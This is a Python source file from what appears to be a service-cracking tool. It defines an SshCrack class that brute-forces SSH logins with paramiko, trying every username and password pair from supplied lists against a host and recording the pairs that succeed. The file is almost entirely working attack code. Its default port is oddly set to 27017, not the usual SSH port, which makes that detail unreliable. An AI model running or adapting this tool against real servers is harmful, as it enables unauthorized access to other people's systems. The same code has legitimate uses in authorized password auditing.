# coding: utf-8
import paramiko
from paramiko import SSHClient
from servicecrack.service.Base import BaseCrack
from servicecrack.utils.logg import Logging

logging = Logging("ssh")
service_name = "ssh"


class SshCrack(BaseCrack):
    def __init__(self, host, port, usernames, passwords):
        super(SshCrack, self).__init__(host, port, usernames, passwords, service_name)
        if not port:
            self.port = 27017

    def run(self):
        self.sshclient = SSHClient()
        for username in self.usernames:
            for password in self.passwords:
                self.crack(username, password)
        logging.info("[+] brute {} ending".format(self.service_name))
        logging.info(self.result)

    def crack(self, username, password):
        logging.debug("start use {} {}".format(username, password))
        success = 0
        try:
            self.sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.sshclient.connect(self.host, port=self.port, username=username, password=password, auth_timeout=self.timeout)
            logging.info("[+] brute success :{} {}".format(username, password))
            success = 1
        except Exception as e:
            logging.debug(e)
            logging.debug("brute faild:{} {}".format(username, password))
            self.sshclient.close()
        finally:
            if not success:
                return
            self.sshclient.close()
            self.result.append({"username": username, "password": password})



